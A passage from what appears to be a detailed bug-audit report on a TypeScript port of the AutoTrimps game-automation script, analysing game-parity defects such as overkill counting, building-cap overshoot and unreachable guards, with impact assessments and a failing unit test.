Sim visibility: none. `setFormation` is traced, but the oracle pins which formation AT chose, not whether the choice was survivable — a wrong verdict and a right verdict are indistinguishable to the differential. Unit-test visibility is also nil today: tests/stance.test.ts pins bleed only at full health (comment at :92) and both `survive` cases pass `ignoreArmy: true`, which disables the entire harm2 term.

**Strongest counter-argument considered.** Two, and the second genuinely caps the severity.

(a) **"Faithful to legacy, therefore intended."** It is byte-identical to `legacy/modules/stance.js` at commit d283f152. This is the standard defence for anything in this module. It fails here for one reason only: the `0` is provably inert (`pre(0) === pre(missingHealth)`), so under the "intended" reading the author typed a literal that changes nothing while the variable that produces the same result sat in scope one line above — and simultaneously passed the *un-subtracted* `healthier` to `directDamage` in the same expression. An author who meant "current squad" wrote line 207; line 213 is a different sentence.

(b) **"The harm2 branch is deliberately optimistic and self-heals."** This is the real mitigant. `newSquadRdy && notSpire && healthier > harm2` exists precisely to say "it is acceptable to lose this squad, a replacement is already bred". So being *more* reckless there is a degree, not a category, error. And it is self-limiting: when the squad dies, the fresh one spawns at full health, `missingHealth` becomes 0, and the substitution becomes a no-op — the bad verdict cannot compound into a stall. The cost is a repeated squad loss inside bleed voids (where you are shedding health fast anyway), not a stuck run. On top of that, the surrounding model is *already* approximate — line 207 mixes `missingHealth` (current-formation units, since soldierHealthMax carries the formation multiplier) with `maxHealth` (candidate-formation units), so "correct" here was never exact. A reasonable maintainer could rate this low-priority. What it cannot be called is correct, and it is a two-token fix (`missingHealth === undefined`, or an `= 0` default param the way `critPower: number = 2` already does at stance.ts:77) with a bounded blast radius.

---

### maxOneShotPower() re-derives the game's getOverkillerCount() and drifts in both directions: it omits Fluffy's `overkiller` reward (−2) and uses raw game.global.uberNature instead of getUberEmpowerment() (+2 below z236)

`src/modules/stance.ts:39`

**Sim-visible?** No. The only consumer is scryer.ts's oneShotPower() (stance.ts:59), and useScryerStance() short-circuits via `never_scry |= game.global.world <= 60 || game.global.highestLevelCleared < 180` (scryer.ts:56) — the corpus tops out at z62 with no Fluffy depth and no Nature system (z236+), so neither drift term can be non-zero in any fixture.

**Trigger.** (a) Undercount: Fluffy currentLevel+prestige > 9 (the `overkiller` reward at rewards index 9, and again at prestigeRewards index 2 → combined index 12) — any late-game U1 player. (b) Overcount: uber-Ice enlightened (game.global.uberNature === "Ice", which resetGame never clears) while game.global.world < 236.

**Actual.** stance.ts:29-49 computes `power = 2 + talents.overkill + (uberNature==="Ice" ? 2 : 0) + (Ice>=50) + (Ice>=100)`. The game's chain length is `2 + getOverkillerCount()` (target + the base Overkill-perk spill + chained cells), and getOverkillerCount() (main.js:12029-12046) is `Fluffy.isRewardActive("overkiller") + talents.overkill + (getEmpowerment()=="Ice" && Ice>=50) + (…>=100) + (getUberEmpowerment()=="Ice" ? 2 : 0)`. AT has no Fluffy term at all, and getUberEmpowerment() (main.js:8193) returns "" whenever `game.global.world < getNatureStartZone()` (236 in U1, main.js:8211) while AT reads game.global.uberNature unconditionally.

**Expected.** Mirror getOverkillerCount() exactly: add `Fluffy.isRewardActive("overkiller")` to the base, and gate the uber-Ice +2 on `getUberEmpowerment() === "Ice"` rather than `game.global.uberNature === "Ice"`.

**Impact.** Split by half — the two halves hit different populations.

UNDERCOUNT (missing Fluffy `overkiller`) — DEFAULT PATH, broad. No setting gates it: `UseScryerStance` and `ScryerUseWhenOverkill` both default `true` and are visible in U1 (settings-visibility.ts:835-836). It fires for every U1 player whose Fluffy `currentLevel + prestige > 9` — i.e. Fluffy E10 onward, a mid-to-late-game milestone reached long before Nature — at any zone > 60 with `highestLevelCleared >= 180`, in world and maps alike. AT's chain-length cap runs 1 low (sum 10-12) or 2 low (sum > 12) forever after. There is no zone at which it self-corrects.

OVERCOUNT (raw `uberNature` instead of `getUberEmpowerment()`) — OPT-IN SETTING / narrow window, +2. Requires `uberNature` set while `world < 236`. Guaranteed for 6 zones (z230-235) of every run for users of `autoenlight` (`'boolean', false` — default OFF, settings-defs.ts:2821), which AT fires at `world > 229`; otherwise it needs a manual pre-236 enlightenment purchase, available from z1 because the Nature tab gates on `getHighestLevelCleared() >= 235` and tokens/levels survive the portal.

SEVERITY: moderate, bounded. The only consumer is scryer stance selection; a wrong cap can flip `HS >= HSD` (scryer.ts:118) and the transition guards at scryer.ts:140-144, so the failure mode is "sits in the wrong formation" — undercount declines a free-overkill scry (lost double loot / Dark Essence), overcount stays in a weak Scryer stance believing an overkill is secured. No crash, no save damage, no progress loss.

CORPUS EXPOSURE: zero, structurally. All 15 fixtures decode to `fluffyExp=0 / fluffyPrestige=0 / uberNature="" / highestLevelCleared <= 61`, and 14/15 have `Overkill.level=0`. `baseline-zero` is not evidence about this code — it is evidence the net cannot reach it. Fixing this needs hand-built evidence (a unit test), not a green trace run.

FAILING VITEST (two directions; create no files — this is the test that fails today):

```ts
// tests/stance.test.ts — game-parity net for maxOneShotPower vs getOverkillerCount
// (main.js:12029-12046). Chain length is `2 + getOverkillerCount()` (main.js:11614-11619).
describe('stance.maxOneShotPower — mirrors the game getOverkillerCount', () => {
  it('counts Fluffy\'s overkiller reward (undercounts by 2 today)', () => {
    ;(globalThis as any).getCurrentEnemy = () => ({ health: 1 })
    ;(globalThis as any).getEmpowerment = () => 'Ice'                  // z300, Nature live
    ;(globalThis as any).Fluffy = { isRewardActive: (r: string) => (r === 'overkiller' ? 2 : 0) }
    ;(globalThis as any).game = makeMinimalGame({
      portal: { Overkill: { level: 5 } },
      talents: { overkill: { purchased: true } },
      global: { world: 300, universe: 1, challengeActive: '', uberNature: '' },
      empowerments: { Ice: { getLevel: () => 100 } },
    })
    // game: 2(Fluffy) + 1(mastery) + 1(Ice>=50) + 1(Ice>=100) = 5 → chain 7
    expect(maxOneShotPower(false)).toBe(7)   // today: 5
  })

  it('gates the uber-Ice +2 on getUberEmpowerment, not raw uberNature (overcounts by 2 today)', () => {
    ;(globalThis as any).getCurrentEnemy = () => ({ health: 1 })
    ;(globalThis as any).getEmpowerment = () => false                  // world < getNatureStartZone()
    ;(globalThis as any).Fluffy = { isRewardActive: () => 0 }
    ;(globalThis as any).game = makeMinimalGame({
      portal: { Overkill: { level: 5 } },
      talents: { overkill: { purchased: false } },
      // enlightened, but below z236 — getUberEmpowerment() returns "" (main.js:8193)
      global: { world: 230, universe: 1, challengeActive: '', uberNature: 'Ice' },
      empowerments: { Ice: { getLevel: () => 100 } },
    })
    // game: getOverkillerCount() === 0 → chain 2
    expect(maxOneShotPower(false)).toBe(2)   // today: 4
  })
})
```

Note that fixing this also requires updating the existing golden master at tests/stance.test.ts:43, which pins the ceiling at 7 with the missing Fluffy term baked in (that fixture has no `Fluffy` stub, so `isRewardActive` must be treated as 0 there).

**Strongest counter-argument considered.** The strongest counter is against the OVERCOUNT half, and it is the one I had to work hardest to kill: I initially expected `game.global.uberNature` to be unsettable below z236, which would make the `getUberEmpowerment()` gate a distinction without a difference. It is not — and the finder's own stated reason (portal does not clear it) is wrong, so the finding was one bad premise away from being refuted. It survives only because the empowerment tokens/levels persist across the portal and `naturePurchase` has no world gate, and above all because AT's own `autoenlight` deliberately buys at z230.

Two honest severity caveats:
1. The overcount half is behind `autoenlight`, which is `'boolean', false` — default OFF. Absent that setting, it needs a manual pre-z236 enlightenment purchase, which is a real but atypical play pattern. Note the z230 row above: for a maxed-Fluffy player the two errors cancel *exactly*, so the population that most reliably hits the z230–235 window is the population least affected by it.
2. The cap only matters when it actually binds. `oneShotPower` exits early on `!getCurrentEnemy(...)` or `damageLeft < 0`, so with damage far above or far below the chain the wrong cap is inert; it changes the answer only in the band where one formation saturates the cap and the other does not. This is a wrong-formation-selection bug, not a stall or a crash.

A weaker counter — "the sim would have caught it" — is dead: I lz-string-decoded all 15 corpus saves. Every one has `fluffyExp=0`, `fluffyPrestige=0`, `uberNature=""`; 14/15 have `portal.Overkill.level=0` (so `maxOneShotPower` takes the `return 1` early exit), the sole exception `12-warp-u1` (z62, Overkill.level=15) yields game=2/AT=2; and every fixture has `highestLevelCleared <= 61`, so scryer.ts:56's `never_scry |= highestLevelCleared < 180` is unconditionally true and no `setFormation` ever issues from this path. Both drift terms are identically zero across the entire corpus — the differential cannot see this, and could not even if the value were arbitrarily wrong.

---

### MetalEfficiencyPriority uses `game.global.challengeActive === 'Metal'`, so it is dead during the Nometal² C² — while jobs.ts uses the game's challengeActive() helper for the same challenge in three places

`src/modules/upgrades.ts:145`

**Sim-visible?** No, twice over. MetalEfficiencyPriority defaults to false so the block is inert on all 12 fixtures, and Nometal² requires HZE 144 while the deepest fixture is z62.

**Trigger.** Running the Nometal Challenge² (config.js:4147, `multiChallenge: ["Nom", "Metal"]`, unlocked at HZE 144) with MetalEfficiencyPriority on and world below MetalEfficiencyZone. On portal the game sets `game.global.challengeActive = 'Nometal'` and `game.global.multiChallenge = {Nom:true, Metal:true}` (updates.js:4673-4680).

**Actual.** The direct string compare is false during Nometal², so the Efficiency-first block never runs — even though the Metal challenge's rules (no Miners, all metal from manual mining, Efficiency doubles it) are fully active. The game's own predicate `challengeActive('Metal')` returns true there (main.js:1753: `if (game.global.multiChallenge[what]) return true`). AT's own jobs.ts uses that helper for exactly this challenge at lines 191, 231 and 303, so the two modules disagree about what "in the Metal challenge" means.

**Expected.** `challengeActive('Metal')`, matching jobs.ts and the game. The setting's own tooltip says it is ignored only when "You are not in the Metal challenge" — a Nometal² run is in the Metal challenge by the game's definition, so the control silently lies there.

**Impact.** **Opt-in setting, deep-game-only challenge — real but low.** Two independent gates keep it off the default path.

*Setting:* `MetalEfficiencyPriority` is `'boolean', false` (settings-defs.ts:61-65). Off, the block is inert regardless of challenge.

*Challenge:* Nometal is `onlySquared: true` with `filter: getHighestLevelCleared(true) >= 144`. Only a player past HZE 144 who explicitly ticks the setting and then runs Nometal² is affected.

*Blast radius when it does bite:* the Efficiency-first priority is silently dropped for the whole window `world < MetalEfficiencyZone` (default 6). Efficiency first unlocks at z2 cell 9 and re-unlocks every even zone, each level doubling `playerModifier` — so the lost window is roughly z2c9 → z5, the exact stretch where manual mining is the metal engine because `main.js:17770` has voided metal loot and `config.js:11167` has confiscated the miner books. The user sees a ticked control do nothing, with a tooltip that says it applies.

*Sim-visible: NO — verified, not assumed.* I decoded all 15 saves in `tests/fixtures/saves/` with the clone's own `lz-string.js`. Every one has `runningChallengeSquared:false` and `multiChallenge:{}`; the only challenges present are Watch (03), Hypothermia (10) and Balance (p18); max `highestLevelCleared` is **61** (12-warp-u1, z62), against the 144 Nometal² requires. The single at-settings fixture carries `"MetalEfficiencyPriority":false`. So `baseline-zero` is green here because the corpus cannot reach the region, not because it checked it — the standard trap. This region is effectively unguarded and would stay green under any mutation of line 145.

**Strongest counter-argument considered.** The honest strongest counter is **nobody can currently observe this, and possibly nobody ever has.** `MetalEfficiencyPriority` is declared `'boolean', false` (settings-defs.ts:61-65), so it is off until a user deliberately ticks it; and Nometal² needs HZE 144. That is a latent defect in an opt-in feature inside a challenge nothing in the repo reaches — genuinely low priority, and it would be wrong to rank it alongside a live-path bug.

The related "this was deliberate scoping" defense is weaker and I broke it three ways: (a) the tooltip's `ignoredWhen` reads "You are not in the Metal challenge" with no C² carve-out, and by the game's authoritative predicate a Nometal² player *is* in it; (b) the #43 rationale ("all metal comes from manual mining, each Efficiency level doubles it") is true verbatim in Nometal² — `main.js:17770` voids metal loot there too; (c) AT's own jobs.ts already answers "yes, this is Metal" for the same state, so deliberate scoping would mean deliberately making two modules contradict each other in the same tick.

One thing I could **not** rule out and am not claiming: whether the ordering change is a net *gain* for a Nometal² player. Nom stacks change the farming shape, and I have no fixture to measure on. The defect is that the user's explicit opt-in is silently ignored, not that AT necessarily plays worse.

Adjacent lead, **not** part of this claim and impact-unverified: `main-loop.ts:562` has `game.global.challengeActive == 'Toxicity'` inside the U2 `Rcarmormagic` branch. Toxad is `blockU1:true, allowU2:true, onlySquared:true, multiChallenge:["Toxicity","Lead"]` — U2-only, so that compare is shadowed in exactly the universe the branch serves. The `== 'Nom'` half of the same expression is *not* shadowed there (Nometal is U1-only). `Rcarmormagic` also defaults 0. Worth filing separately; I did not work it.

---

## LOW

### forceAbandonTrimps()'s Spire guard is an always-false conjunction of two mutually exclusive predicates — the Trimpicide tooltip's "Never fires in the Spire" is carried entirely by the caller

`src/modules/breedtimer.ts:259`

**Sim-visible?** No — and it could not be, by construction: a guard that can never be taken produces no trace delta whether it is present or absent. Mutating it would leave baseline-zero green.

**Trigger.** Any call to forceAbandonTrimps() while game.global.spireActive is true — reachable only if a future caller drops trimpcide()'s own spire guard, or if the published globalThis.forceAbandonTrimps is called directly.

**Actual.** `if (isActiveSpireAT() && disActiveSpireAT() && !game.global.mapsActive) return;`. isActiveSpireAT() (src/modules/other.ts:88) requires `game.global.challengeActive != 'Daily'`; disActiveSpireAT() (other.ts:92) requires `game.global.challengeActive == 'Daily'`. The conjunction is unsatisfiable, so this guard can never return and the function has no working Spire exclusion of its own. The ONLY thing keeping the tooltip's promise is trimpcide()'s separate `&& !game.global.spireActive` (src/modules/other.ts:154), which happens to be the sole caller — so the bug is currently masked, not live. Every sibling that wants "in any spire" spells it with OR (scryer.ts:60, :92, :96, breedtimer.ts:158/160 use one or the other individually); this is the only `&&` in the repo (verified by grep).

**Expected.** `if ((isActiveSpireAT() || disActiveSpireAT()) && !game.global.mapsActive) return;` — the OR form every other call site uses, so the function is self-sufficient rather than depending on an invariant one caller happens to enforce.

**Impact.** DEAD CODE / LATENT TRAP — no current user impact. Severity: very low; correctness/hygiene, not behaviour.

- Setting: ForceAbandon ("Trimpicide"), boolean, DEFAULT TRUE (settings-defs.ts:2231), rendered U1-only (settings-visibility.ts:645). So the owning feature is on the default path for every U1 user — but the defective guard is not.
- Behavioural impact TODAY: exactly zero, in every state the program can reach. The sole caller trimpcide() (other.ts:152/154) requires `!game.global.spireActive`, which makes both predicates false regardless of the operator. Measured 0/48 reachable states differ between the shipped `&&` and the proposed `||`. The tooltip's "Never fires in the Spire" promise IS kept — by the caller.
- Who is exposed: nobody, unless (i) a future edit removes trimpcide's `!spireActive` conjunct, or (ii) someone calls the bridge-published `globalThis.forceAbandonTrimps` from the console (it is declared at src/game/at-legacy.d.ts:348). In case (i) a default-on U1 user standing in a Spire in the World would have their squad Trimpicided mid-Spire, losing Spire progress — real but hypothetical harm.
- Corpus/sim: correctly outside the net's reach, and not because the corpus is shallow — a guard that can never be taken emits no trace delta whether present, absent, `&&`, or `||`. Mutating it leaves baseline-zero green by construction, so the proof net is not evidence either way here.
- Disposition recommendation: file as a low-priority correctness/hygiene issue, NOT a shipped fix, and correct the remedy — the guard that matches both the tooltip and the caller is `game.global.spireActive && !game.global.mapsActive`, not the OR form the finder proposed (the OR form leaks 6/6 in-Spire states below the default IgnoreSpiresUntil = '200'). Also note it is byte-faithful to legacy modules/breedtimer.js:141, so any change is a deliberate upstream divergence and should be labelled as such.

**Strongest counter-argument considered.** Three refutation attempts, in descending strength:

(a) ZERO IMPACT, NOT MERELY MASKED. The finder frames this as "the bug is currently masked" — implying a live latent hazard. It is stronger than that: because trimpcide gates on `!game.global.spireActive`, and spireActive is a conjunct of BOTH predicates, the guard is unreachable-as-true under `&&` AND under `||`. Measured: 48/48 reachable states, 0 fires either way. So this is not a bug that "would fire if unmasked by an edit"; it is unreachable dead code whose correction produces literally no behavioural delta in any state the program can occupy. No user has ever been or can be affected without an unrelated future edit to the caller.

(b) FAITHFUL TO LEGACY, AND THE PARITY GATE DEMANDED IT. Verbatim in `modules/breedtimer.js:141` at ce821411. The conversion recipe and the byte-parity gate both require the port to preserve upstream semantics; changing `&&` to anything is a deliberate divergence from upstream AutoTrimps, not a port defect. Under the brief's own "filter faithful-to-legacy-intended from genuine defects" rule, one could argue this belongs in the inherited-quirk bucket.

(c) THE PROPOSED FIX IS WORSE THAN THE STATUS QUO. Applying the finder's `||` while leaving trimpcide's guard in place is a no-op; applying it if trimpcide's guard were ever removed would silently permit Trimpicide inside every Spire below z200 (default IgnoreSpiresUntil = '200') — i.e. it would manufacture the exact tooltip violation the finding says it prevents, in 6/6 measured sub-200 in-Spire states. A finding whose remedy introduces the harm it names is arguably net-negative to file as written.

Why none of these overturn CONFIRMED: the brief explicitly asks for "a branch that cannot be taken" and "a comparison that is always true", and this is the repo's only unsatisfiable predicate conjunction. Being faithful to legacy makes it an inherited defect, not a non-defect (the same reasoning would have dismissed #119's disActiveSpireAT inversion, which was fixed). And (c) argues the finding needs a corrected remedy, not that the code is fine.

---

### U1 buyers check the cap on `owned` and then let safeBuyBuilding's bulk ladder buy up to 10 — Max Wormholes can be overshot by 9 on a helium purchase

`src/modules/buildings.ts:349`

**Sim-visible?** No, doubly. I decoded all 15 saves: every one has `roboTrimpLevel === 0`, so getHighestBionic() is 0 and both bwRewardUnlocked checks are false — safeBuyBuilding's entire bulk ladder is dead in the corpus and every recorded buy is at buyAmt=1, which also means #123's stacking work has no trace coverage at all. Separately, MaxWormhole's default is '0', so `getPageSetting('MaxWormhole') > 0` is false and line 350 is never reached on default settings either.

**Trigger.** Universe 1, `MaxWormhole` set to a positive number (it is opt-in; default 0), Wormhole unlocked, `bwRewardUnlocked('DoubleBuild')` or `('DecaBuild')` true (highest Bionic Wonderland level 185 / 305), owned == cap-1, and enough helium+metal for the full stack.

**Actual.** Line 349 gates on `game.buildings.Wormhole.owned < getPageSetting('MaxWormhole')` and then calls `safeBuyBuilding('Wormhole')` with no amount. safeBuyBuilding lines 99-112 then set `game.global.buyAmt` to 10 (DecaBuild) or 2 (DoubleBuild) if affordable, and line 144's `buyBuilding(building, true, true)` takes that full amount (Wormhole has no `percent` flag, so main.js:4841 uses game.global.buyAmt verbatim). So a user who sets Max Wormholes = 5 with 4 owned ends up with 14. The same un-clamped shape applies to the other U1 gates that pass no amount: MaxGym (354), MaxTribute (397), MaxNursery (402/428) and both housing buyers (184, 337).

**Expected.** Clamp the stack to the room left under the cap, exactly as the U2 siblings already do — RbuyBuildings lines 753-755 compute `room = cap - purchased` and pass `Math.min(bulkBuyAmount(), room)`, and lines 781-783 do the same for Laboratory, with #123's comment stating the intent: "so a stack cannot overshoot the user's cap". The U1 buyers were left on the un-clamped ladder when #123 added that clamp. Wormhole is the case that matters most because its cost is helium, which the setting's own tooltip singles out ("Wormholes cost helium, not gold — a Wormhole bought is helium you can't spend on perks that portal") and because MaxWormhole is documented as the only brake ("0 or lower means AT never buys a Wormhole at all; you must set a specific positive number to allow any").

**Impact.** OPT-IN AND DEEP-GAME ONLY FOR WORMHOLE; DEFAULT-PATH FOR THE SIBLING CAPS. Nobody is affected without `roboTrimpLevel >= 5` (DoubleBuild, BW185 — overshoot capped at 1) and the real damage needs `>= 13` (DecaBuild, BW305 — overshoot up to 9). That is a deep but entirely normal AT player, since roboTrimpLevel is permanent across portals.

Wormhole itself: LOW by default. `MaxWormhole` defaults to `'0'`, so line 350 is unreachable until the user opts in. When they do, the overshoot spends the one resource the setting's own tooltip warns about — at cap 100 / owned 99 the intended buy is 1.29e4 helium and the actual is 1.82e5, a 14.15x overspend on a single purchase, plus 2.00e10 metal against an intended 1.25e9.

The same un-clamped shape is NOT all opt-in, which is the part worth acting on. `buyGemEfficientHousing` (line 337) is governed by `MaxGateway`, whose createSetting default is `'25'` — on the always-affordable lattice that becomes 30 Gateways, a 20% overshoot, on stock settings. `buyFoodEfficientHousing` (line 184) is governed by `MaxHut`/`MaxHouse`/`MaxMansion`/`MaxHotel`/`MaxResort`, all default `'100'` and all live (I confirmed `FoodEfficiencyIgnoresMax` and `GemEfficiencyIgnoresMax` are read at lines 152/238 but never createSetting'd, so both return false and the caps genuinely bind). Those overshoot whenever the ladder's rung changes mid-climb. Given the #140 finding that the housing caps are load-bearing for steering AT away from Collectors, silently exceeding them is not cosmetic. `MaxGym` (354), `MaxTribute` (397) and `MaxNursery` (402/428) default to `-1` and are inert until a user sets a positive cap; note Gym's `buyAmt = 1` clamp at line 127 only fires when `GymWall > 0`, and GymWall defaults to -1, so Gym is un-clamped on defaults too.

Evidence risk is the sharper cost: with every fixture at roboTrimpLevel 0, the proof net cannot see any of this. Adding fixture coverage would need a save carrying a Bone-Portal reward, which the corpus does not have — and the same blindness currently covers #123's U2 clamp, so the one place the invariant IS implemented is also unguarded by L0.

**Strongest counter-argument considered.** FAITHFUL TO LEGACY. `git log -S"MaxWormhole') > 0 && game.buildings.Wormhole.owned" --all` returns exactly one commit — `d283f152 Phase 0: modernization foundation`, the verbatim legacy import. The DecaBuild ladder in `safeBuyBuilding` traces to the same commit. So the U1 buyers have been un-clamped since before the fork, and nothing in this repo ever regressed them; #123 (b269c88a) only added the `amount` parameter and applied it to U2. Under "filter faithful-to-legacy-intended from genuine defects", this could be read as the original author's accepted behaviour rather than a defect.

I do not think it survives, for three reasons: AT itself ships a tooltip that calls the setting a cap; #123 wrote the opposite intent into the same file and backed it with a passing test, so the project has already decided what the invariant is and only applied it to one universe; and the game's own AutoStructure buyer clamps the identical bulk amount against the identical kind of cap, which is the authoritative statement of what "Up To: N" means in Trimps.

Two honest weakenings of the finding's magnitude, though. First, the overshoot is not 9 every time — it is `(stack - (room mod stack)) mod stack`. The default housing caps are all multiples of 10, so a post-portal climb from owned=0 with the ladder pinned at 10 lands exactly on 100 and overshoots by nothing. The damage appears when the ladder's rung changes mid-climb (ordinary early-run affordability) or when the cap is not on the lattice — `MaxGateway`'s default of 25 overshoots to 30 even with perfectly steady affordability. Second, for Wormhole specifically the population is narrow: a player must both hold BW185/BW305 and have deliberately typed a positive Wormhole cap.

I also checked and rejected two other refutations: the native confirm-purchase dialog (needs `!fromAuto`; AT passes true) and a live cap on roboTrimpLevel (it is a save-migration line, not a cap).

---

### calcEnemyBaseAttack's map ×1.1 threshold is `zone > 5` where the game uses `world > 6`

`src/modules/calc.ts:477`

**Sim-visible?** No — same reason as the zone-1/2 drift: the wrong number is already the recorded baseline, and a 10% enemy-attack shift at z6 does not flip any native-mutator decision.

**Trigger.** Enemy-attack prediction for a map (or void map) whose level is exactly 6 — i.e. the first maps a run unlocks, around z6-7.

**Actual.** `if (zone > 5 && type !== "world") attack *= 1.1;` — fires at level 6.

**Expected.** .trimps-game/config.js:510 is `if (world > 6 && game.global.mapsActive) amt *= 1.1;` — the game does NOT apply it at level 6, only from 7 up. (The health sibling really is `> 5`, config.js:551, and AT's U2 RcalcEnemyBaseHealth at calc.ts:1555 copies that one correctly — the two game thresholds genuinely differ, so this is a cross-copied constant, not a game inconsistency.)

**Impact.** **Real users: LOW, opt-in only.** The stance path (`stance.ts:89,144` → `setFormation`) is unreachable at map level 6 for an actual player because `autoStance` requires `game.upgrades.Formations.done`, which only `breakPlanet()` at z60 grants and every portal clears (verified in the z6 and z58 saves). The one live consumer is `buildings.ts:363`, behind `DynamicGyms` — `'boolean'`, **default `false`**, hidden entirely in U2. For a U1 player who turns it on, at world 6–7 inside the level-6 Tricky Paradise, AT over-estimates enemy attack by exactly 10%, so `currentEnemyDamageOK` stays false past the point it should flip and AT keeps buying Gyms slightly longer than needed. Mild over-buy of one building for a few zones; no crash, no stall.

**Repo/proof-net: MEDIUM, and this is the part that costs time.** The line *is* executed by the corpus — `08-starved-u1` boots inside the level-6 map with Formations bought and `AutoStance` defaulting to 1, and it is the designated damage-sensitivity fixture whose thresholds are not saturated. The wrong ×1.1 is therefore baked into the committed oracle traces. Fixing `zone > 5` → `zone > 6` will very likely move `08-starved-u1`'s (and possibly `06-deep-u1`'s) recorded `setFormation` events, so it is not a free edit: per CLAUDE.md an oracle re-record replays the frozen bundle and re-pins across every src commit since the tag. Budget the fix as "one-line change + oracle re-record", not as a one-liner.

**Coverage gap it exposes:** no test anywhere calls `calcEnemyBaseAttack`/`calcEnemyAttackCore` with a non-`'world'` type, and `tests/calc.test.ts:158` says its goldens were derived from the *legacy* formula rather than from `.trimps-game/`. The whole map-multiplier branch of AT's enemy-attack mirror is unguarded against game drift.

**Strongest counter-argument considered.** **The consumers are unreachable for real players at map level 6, so nothing observable is wrong on the default path.**

`autoStance()` returns at `stance.ts:224` on `!game.upgrades.Formations.done`; `autoStance2()` and `windStance()` add `game.global.world <= 70`; `useScryerStance()` has `never_scry |= game.global.world <= 60`. `Formations` is granted only by `breakPlanet()` (`main.js:16827`) at z60 and is re-locked every portal — I verified this empirically: `05-maps-u1` (z6) and `13-z58-gearwall-u1` (z58) both decompress with `upgrades.Formations.done = 0, locked = 1`. A real player running the level-6 Tricky Paradise at world 6–7 therefore never reaches the stance math, and by the time formations exist (z60+) AT is not running level-6 maps. The only real-player consumer left is `buildings.ts:363` (`currentEnemyDamageOK = block > nextGym * calcSpecificEnemyAttack()`), gated on `DynamicGyms` — `createSetting('DynamicGyms', …, 'boolean', false, …)` at `settings-defs.ts:2232`, **default off**, and forced off in U2 (`settings-visibility.ts:639`). So one could argue this is a latent constant with no live victim.

This lowers the severity but does not refute the defect: the fixtures that *do* reach it are the ones the proof net trusts, the drift is a provable mismatch against a game constant CLAUDE.md requires AT to mirror exactly, and any future consumer of `calcSpecificEnemyAttack` below z60 inherits it silently.

A second, weaker counter: "faithful to legacy." True — `zone > 5` predates the TS port (`git log -S` traces it back through `7f9cac67 Update calc.js`; `2c586283` only tightened `!=`→`!==`). But the rest of the function is byte-exact against the game (proved: identical integers at levels 5, 7, 8), so this is drift in AT's re-derived math, not a deliberate model difference — and fixing it restores a game constant rather than changing balance.

---

### A block-stat Shield falls through both cap settings to the hardcoded initializer 100, silently ignoring the user's Armor Level Cap

`src/modules/equipment.ts:217`

**Sim-visible?** NO. Neither blockNow save has an oracle trace file (tests/fixtures/traces/ contains 01-12 only; 13 and 14 are used by the dedicated gear-wall / gem-housing suites), so the L0 differential never runs a blockNow state. Even if it did, Shield.level=1 is below both candidate caps, so the two cap values produce an identical trace.

**Trigger.** U1 after the Shieldblock upgrade is bought (`game.equipment.Shield.blockNow === true`), so `evaluateEquipmentEfficiency` rewrites `equip.Stat = 'block'` at :162. True on corpus saves 13-z58-gearwall-u1 and 14-gem-housing-frag-lock-u1.

**Actual.** `let cap = 100;` then `if (Stat === 'health') cap = getPageSetting('CapEquiparm'); if (Stat === 'attack') cap = getPageSetting('CapEquip2');` — 'block' matches neither, so `cap` keeps the literal 100. The wall checks at :220/:223 therefore let AT level a blocking Shield to 100 (or to 10 under liquification, via `cap / capDivisor`) instead of to the user's CapEquiparm, whose shipped default is 10. Gym has the same Stat ('block') and additionally is a `game.buildings` entry with no `.level`, so `undefined >= 100` is false and neither cap branch can ever fire for it either.

**Expected.** A blocking Shield is still armour: it belongs to `CapEquiparm`, exactly as the tooltip promises — 'Armor Level Cap: Do not level armor past this level … Disable with -1 or 0.' Nothing in the tooltip warns that buying Shieldblock replaces the user's cap with a hidden 100.

**Impact.** **U1 only, opt-in, narrow zone band — real but low-to-moderate.**

- **Universe:** U1 only. `settings-visibility.ts:423-424` turns `CapEquiparm`/`CapEquip2` off when `radonon`, and `evaluateEquipmentEfficiency` is the U1 buyer. No render/runtime gate mismatch.
- **Reachability:** needs `game.equipment.Shield.blockNow === true`, i.e. the Shieldblock upgrade bought *this run* (the game's own confirm dialog says "until your next portal", main.js:5487, and there is no `blockNow = false` assignment anywhere — it resets with the portal's fresh `game.equipment`). AT only buys Shieldblock when `BuyShieldblock` is ON, and that setting **defaults to `false`** (settings-defs.ts:1094-1097). So: opt-in setting, or a manual player purchase.
- **Who it hurts:** a U1 player who turns Shieldblock on (or buys it by hand) between roughly z10 and z25, with ~30+ Gyms. AT levels the block Shield to 13-50 instead of the user's `CapEquiparm` (default 10) — 4 to 41 extra levels, each 1.2× the last in wood — silently ignoring a setting whose tooltip says "Do not level armor past this level. … Disable with -1 or 0." Nothing warns that buying Shieldblock swaps the cap for a hidden 100. Under liquification the divergence is 10 vs `CapEquiparm/10` (i.e. 1 by default).
- **Who it does not hurt:** anyone at `CapEquiparm = 100` (inert by coincidence — one of the two frozen real-user blobs is exactly that); anyone deep enough for Gyms to dominate the shared `blockwood` bucket (both repo saves at z58/z60); all U2 players.
- **Gate coverage:** effectively unguarded. `tests/fixtures/traces/` covers 01-12 only and all twelve have `blockNow === false`, so the L0 differential never enters this branch — and saves 13/14 would trace identically under either cap value, so adding traces for them would *not* close the hole. A unit test on `evaluateEquipmentEfficiency` is the only thing that can catch it.

**Strongest counter-argument considered.** Two, and the second one genuinely narrows this.

**(a) "It's a faithful port of legacy; the 100 is the author's choice."** Verified true as a transcription fact (legacy lines 157-159 identical). But faithfulness is not intent: there is no comment, the tooltip contradicts it, and `other.ts:78` caps the same Shield by `CapEquiparm` regardless of `blockNow`. Also, if "block Shield is exempt from the cap" were the design, the fallback would be `Infinity`, not a magic 100 that still walls at level 100 — so it isn't a coherent exemption, it's a leftover initializer.

**(b) The real killer of impact: the two saves that actually carry `blockNow` are exactly the ones where the bug cannot bite.** At z58/z60 with 153/162 Gyms, Gym's Factor beats Shield's by 70× and 184×, so `Best['blockwood'].Name` resolves to `'Gym'`, `DaThing.Equip` is false, and no Shield level is ever bought through that bucket — the two cap values are behaviourally identical. The window where the divergence is real is z10-~25 with ≥30 Gyms and Gymystic fully bought (between z25 and z55 a pending Gymystic force-walls the Shield anyway at :231-236). Add that `BuyShieldblock` defaults to `false` (settings-defs.ts:1094-1097) and its own tooltip says "if you are progressing past zone 60, you probably do not want this", and one of the two frozen real-user settings blobs has `CapEquiparm: 100` — for that user the bug is exactly inert. So this is a real defect in a narrow, opt-in band, not a broad one.

---

### nameAndSaveNewProfile's empty-name guard can never fire, and nothing rejects a duplicate name — a second profile with the same name is permanently unloadable

`src/modules/import-export.ts:115`

**Sim-visible?** No. Profile-naming UI only; no native mutator involved and no test in tests/ touches nameAndSaveNewProfile or confirmedSwitchNow.

